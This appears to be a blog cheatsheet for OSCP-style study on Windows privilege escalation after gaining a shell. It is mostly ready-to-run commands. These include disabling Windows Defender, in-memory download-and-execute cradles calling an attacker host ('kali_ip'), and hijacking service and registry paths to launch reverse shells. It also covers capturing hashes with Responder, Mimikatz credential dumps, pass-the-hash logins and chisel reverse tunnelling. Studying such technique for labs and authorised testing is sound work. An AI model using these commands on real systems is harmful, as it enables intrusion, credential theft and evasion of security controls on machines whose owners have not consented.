---
title: Windows Privilege Escalation
date: 2020-06-26 18:05:42
tags: [oscp, cheatsheet, windows, privilege escalation]
aliases:
    - /windows-privesc
    - /postexp-windows
---

# Windows Privilege Escalation Cheatsheet

Latest updated as of: *12 / June / 2022*

So you got a shell, what *now*?<br>
This post will help you with local enumeration as well as escalate your privileges further.

Usage of different enumeration scripts and tools is encouraged, my favourite is [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS). If confused which executable to use, use [this](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASany.exe)

Keep in mind:
* To exploit services or registry, you require:
    * appropriate write permissions
    * service start permission
    * service stop permission
* Look for non-standard programs on the system

*Note: This is a live document. I'll be adding more content as I learn*

## Binaries
Get 64-bit netcat from [here](https://eternallybored.org/misc/netcat/)
Get Chisel from [here](https://github.com/jpillora/chisel/releases) 

## General Information
If nothing is specified, assume command can be run on cmd.exe or powershell.exe

### Who am I?
``` powershell
whoami
echo %username%
```

### Do I have anything fun?
Notice groups you are part of and privileges you have
``` powershell
whoami /all
```

### Where am I?
``` powershell
hostname
echo %hostname%
```

### Anyone home?
Local users
``` powershell
net users
```
Domain users
``` powershell
net users /domain
```

### What am I part of?
Local groups
``` powershell
net groups
```

Domain groups
``` powershell
net groups /domain
```

### What is this place?
```
systeminfo
```

### Is it fancy?
Both should be the same for ease of exploitation, if either is 32-bit then try to gain a 64-bit shell.
<br>
Use PowerShell

``` powershell
[environment]::Is64BitOperatingSystem
[environment]::Is64BitProcess
```

### Am I tied up?
Check LanguageMode. FullLanguage is nicer to have.<br>
Use PowerShell
``` powershell
$ExecutionContext.SessionState.LanguageMode
```

### Anything reachable?
Use PowerShell
``` powershell
Get-AppLockerPolicy -Effective
Get-AppLockerPolicy -Effective | select -ExpandedProperty RuleCollections
```

### What does the inside look like?
Look for interesting services
``` powershell
netstat -ano
```

### Leave me alone
Do you have admin privs?<br>

Disable Windows Defender real time monitoring
``` powershell
Set-MpPreference -DisableRealTimeMonitoring $true	
```

Disable Windows Defender scanning for all files downloaded
``` powershell
Set-MpPreference -DisableIOAVProtection $true	
```

## File Transfer

### SMB

On KALI, start smb server to serve files. Get impacket from [here](https://github.com/SecureAuthCorp/impacket/releases/)
<br>
> Use double-quotes if file path has spaces in it 

``` bash
sudo impacket-smbserver abcd /path/to/serve
```
You can download files in multiple ways.<br>
**Mount drive**
> CMD or PowerShell
``` powershell
net use abcd: \\kali_ip\myshare
net use abcd: /d # disconnect
net use abcd: /delete # then delete
```
> PowerShell
``` powershell
New-PSDrive -Name "abcd" -PSProvider "FileSystem" -Root "\\ip\abcd"
Remove-PSDrive -Name abcd
```
**Copy w/o mounting**
``` powershell
copy //kali_ip/abcd/file_name C:\path\to\save
copy C:\path\to\file //kali_ip/abcd
```

### HTTP

Load script in memory
> May help bypass trivial anti-virus solutions
``` powershell
powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ip/file')"
```
``` powershell
powershell.exe iex (iwr http://ip/file -usebasicparsing)
```

Save to disk
``` powershell
powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadFile('http://ip/file','C:\Users\Public\Downloads\file')"
```
``` powershell
powershell.exe -nop -ep bypass -c "IWR -URI 'http://ip/file' -Outfile '/path/to/file'"
```
> CMD or PowerShell
``` powershell
certutil -urlcache -f http://kali_ip/file file
```
## Automated Enumeration
### WinPEAS
WinPEAS can be found [here](https://github.com/carlospolop/PEASS-ng/releases)

For color, first apply below registry settings and then spawn a new shell
```
REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
```

``` powershell
.\winpeasany.exe quiet
```

### Exploit suggester
This works well with older machines

Windows exploit suggester can be found [here](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
This script will be executed on Kali. First take the `systeminfo` info, paste it in a file

An update may be required, it will generate the Excel file necessary
``` powershell
.\windows-exploit-suggester.py --update
```

Find vulns
``` powershell
.\windows-exploit-suggester.py -i systeminfo.txt -d 2022-xxx.xlsx
```

### PowerUp
PowerUp can be found [here](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)<br>
Although not entirely allowed, we can leverage its `Invoke-AllChecks` function to quickly find escalation points

The script can be executed in multiple ways
1. Save on disk, and execute
``` powershell
powershell -ep bypass -c "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
```

2. Execute from memory

Modify the script to contain `Invoke-AllChecks` at the bottom of the script

``` powershell
powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ip/PowerUp.ps1')"
```

## Hacking the Services

### Checking Access using Accesschk.exe

Below should give you an idea of some of the useful flags
``` powershell
# .\accesschk.exe /accepteula
# -c : Name a windows service, or use * for all
# -d : Only process directories
# -k : Name a registry key e.g., hklm/software
# -q : Omit banner
# -s : Recurse
# -u : Suppress errors
# -v : Verbose
# -w : Show objects with write access
```

Checking service permissions
> ALWAYS RUN THE FOLLOWING TO CHECK IF YOU'VE PERMISSIONS TO START AND STOP THE SERVICE
``` powershell
.\accesschk.exe /accepteula -ucqv <user> <svc_name>
```

Get all writable services as per groups
``` powershell
.\accesschk.exe /accepteual -uwcqv Users *
.\accesschk.exe /accepteula -uwcqv "Authenticated Users" *
```

Check unquoted service paths by testing if directories are writable
``` powershell
.\accesschk.exe /accepteula -uwdv "C:\Program Files"
```

Check user permissions on an executable
``` powershell
.\accesschk.exe /accepteula -uqv "C:\Program Files\abcd\file.exe"
```

Find all weak permissions
<br>
Folders

``` powershell
.\accesschk.exe /accepteula -uwdqs Users c:\
.\accesschk.exe /accepteula -uwdqs "Authenticated Users" c:\
```
Files

``` powershell 
.\accesschk.exe /accepteula -uwqs Users c:\*.*
.\accesschk.exe /accepteula -uwqs "Authenticated Users" c:\*.*
```

Weak registry permissions
``` powershell
.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\svc_name
```

### Getting ACLs
Can we do something about it?

> PowerShell

Getting ACLs of services
``` powershell
Get-Acl HKLM\System\CurrentControlSet\Services\svc_name | Format-List
```

Get ACLs of any file or folder
``` powershell
(get-acl C:\path\to\file).access | ft IdentityReference,FileSystemRights,AccessControlType
```

### Exploiting Services - sc.exe

Query service configuration

> Verify config after doing all the changes

``` powershell
sc qc svc
```

What is the current state of the service?
``` powershell
sc query svc
```

Modifying config
``` powershell
sc config svc binpath= "\"C:\Downloads\shell.exe\""
```

If dependencies exist, make it auto or NULL

> Check if you can restart the dependant svc 

``` powershell
sc config depend_svc start= auto
net start depend_svc
net start svc
```

``` powershell
sc config svc depend= ""
```

Turn it off and back on again
``` powershell
net start/stop svc
```

## Registry 
``` powershell
# Query configuration of registry entry of the service
reg query HKLM\System\CurrentControlSet\Services\svc_name

# Point the ImagePath to malicious executable
reg add HKLM\SYSTEM\CurrentControlSet\services\svc_name /v ImagePath /t REG_EXPAND_SZ /d C:\path\shell.exe /f

# Start/stop the service to get the shell
net start/stop svc

# Execute a reverse_shell.msi as admin
# Manually, both query's output should be 0x1 to exploit
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

## Credentials or Hashes

### Finding credentials
Common creds location, always in plaintext
``` powershell
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogin"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

Look for interesting files that may contain creds
``` powershell
dir /s SAM
dir /s SYSTEM
dir /s Unattend.xml
```

### Extracting credentials
**No Admin**
SMB can be used to extract credentials.<br>

First check if target connects back<br>
Start a listener on 445

``` bash
sudo nc -nvlp 445
```
Get target to connect to it 
``` powershell
copy \\kali_ip\test\file
```
If nc shows connection, it means hash can be extracted

> Responder is an [OffSec authorized tool now](https://help.offensive-security.com/hc/en-us/articles/4412170923924-OSCP-Exam-FAQ)

Replace interface as required

``` sudo
sudo responder -I tun0 -wrf
```

Get the target to connect to your server and it will start dropping hashes. These are now required to cracked by your fav cracker (john or hashcat) to be able to use them to pass-the-hash

**With Admin**
Mimikatz requires admin since a handle on lsass is needed to play with credentials (tokens,hashes,tickets)
Use can either use mimikatz.exe or Invoke-Mimikatz.ps1

Elevate privileges to debug
``` powershell
privilege::debug
```

Dump logged on user and computer credentials
``` powershell
sekurlsa::logonpasswords
```

Elevate privileges to SYSTEM by impersonation
``` powershell
token::elevate
```

Retrieves credential from LSA
``` powershell
lsadump::lsa /patch
```

List credentials in CredentialManager
``` powershell
vault::list
```

Dump credentials in CredentialManager - plaintext password
``` powershell
vault::cred /patch
```

### Leverage credentials
Found plaintext password?
On attacker machine you can attempt to login

`--system` only works if admin creds are on hand

``` powershell
winexe -U 'user%pass123' [--system] //10.10.10.10 cmd.exe
```

Found hash instead of plaintext password?
``` powershell
pth-winexe -U 'domain\user%hash' [--system] //10.10.10.10 cmd.exe
```

## RunAs
CMD
``` powershell
runas /savecred /user:admin C:\abcd\reverse.exe
```

PowerShell Runas 1

``` powershell
$password = ConvertTo-SecureString 'pass123' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('Administrator', $password)
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://kali_ip/shell.ps1')" -Credential $cred
``` 

PowerShell Runas 2

``` powershell
$username = "domain\Administrator"
$password = "pass123"
$secstr = New-Object -TypeName System.Security.SecureString
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16/shell.ps1') } -Credential $cred -Computer localhost
```

## Find Files Fast

CMD or PowerShell
``` powershell
dir /s <filename> # or extensions
```

PowerShell

``` powershell
Get-ChildItem -Path C:\ -Include *filename_wildcard* -Recurse -ErrorAction SilentlyContinue
```

## Port Forwarding 
``` powershell
# If some port are listening on the target machine but inaccessible, forward the ports - Port Forwarding
# winexe, pth-winexe, smbexec.py, psexec works on 445, MySQL on 3306
# On KALI
./chisel server --reverse --port 9001
# On Windows
.\chisel.exe client KALI_IP:9001 R:KALI_PORT:127.0.0.1:WINDOWS_PORT
# Example --> .\chisel.exe client KALI_IP:9001 R:445:127.0.0.1:445

# On KALI
winexe -U 'administrator%pass123' --system //127.0.0.1 KALI_PORT
smbexec.py domain/username:password@127.0.0.1 
mysql --host=127.0.0.1 --port=KALI_PORT -u username -p
```
